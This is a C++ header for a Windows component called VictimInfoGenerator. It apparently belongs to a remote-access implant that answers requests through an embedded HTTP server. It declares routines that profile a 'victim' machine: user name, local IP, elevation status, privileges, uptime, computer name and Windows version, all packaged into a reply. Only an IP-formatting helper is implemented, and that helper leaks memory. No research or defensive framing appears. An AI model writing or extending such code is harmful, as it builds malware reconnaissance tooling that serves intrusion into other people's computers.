#ifndef VICTIM_INFO_HPP
#define VICTIM_INFO_HPP

#include "task_handler_interface.h"
#include "request.hpp"
#include "reply.hpp"
#include "mime_types.hpp"

#include <chrono>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <iostream>
#include <bitset>
#include <sstream>
#include <sysinfoapi.h>
#include <VersionHelpers.h>


#pragma comment(lib, "ws2_32.lib")

namespace http {
	namespace server {

		class VictimInfoGenerator : public TaskHandlerInterface, private boost::noncopyable
		{
			public:

				explicit VictimInfoGenerator(boost::asio::ip::tcp::socket& sock, boost::asio::io_service& io_ref);

				static wchar_t* _GetUserNameW();

				struct IPv4
				{
					unsigned char b1, b2, b3, b4;

					wchar_t* GetWideCharIp()
					{
						#define IP_SIZE 16
						#define DIGIT_SIZE 4
						char* ipAddress = new char[IP_SIZE];
						memset(ipAddress, 0, IP_SIZE);
						char* char_digit = new char[DIGIT_SIZE];
						_itoa_s(b1, char_digit, DIGIT_SIZE, 10);
						strcat_s(ipAddress, IP_SIZE * sizeof(char), char_digit);
						strcat_s(ipAddress, IP_SIZE * sizeof(char), ".");
						_itoa_s(b2, char_digit, DIGIT_SIZE, 10);
						strcat_s(ipAddress, IP_SIZE * sizeof(char), char_digit);
						strcat_s(ipAddress, IP_SIZE * sizeof(char), ".");
						_itoa_s(b3, char_digit, DIGIT_SIZE, 10);
						strcat_s(ipAddress, IP_SIZE * sizeof(char), char_digit);
						strcat_s(ipAddress, IP_SIZE * sizeof(char), ".");
						_itoa_s(b4, char_digit, DIGIT_SIZE, 10);
						strcat_s(ipAddress, IP_SIZE * sizeof(char), char_digit);

						size_t size = mbstowcs(NULL, ipAddress, 0);
						wchar_t* ipAddressW = new wchar_t[size + 1];
						memset(ipAddressW, 0, size * sizeof(wchar_t) + sizeof(wchar_t));
						mbstowcs(ipAddressW, ipAddress, size + 1);
						return ipAddressW;
					}
				};

				static wchar_t* GetLocalIpAddress();

				static BOOL IsElevated();

				static wchar_t* _GetPrivileges();

				static wchar_t* GetUpTime();

				static wchar_t* _GetComputerName();

				static wchar_t* _GetWindowsVersion();

				boost::system::error_code  get_victim_info(std::shared_ptr<std::vector<char>> buffer);

				void on_get_victim_info(std::shared_ptr<request> req, std::shared_ptr<reply> rep, std::shared_ptr<std::vector<char>> buffer, boost::system::error_code& e);

				void handle_write(std::shared_ptr<reply> rep, const boost::system::error_code& e, std::size_t bytes);

				bool execute(std::shared_ptr<request> req) override;
		};
	}
}
#endif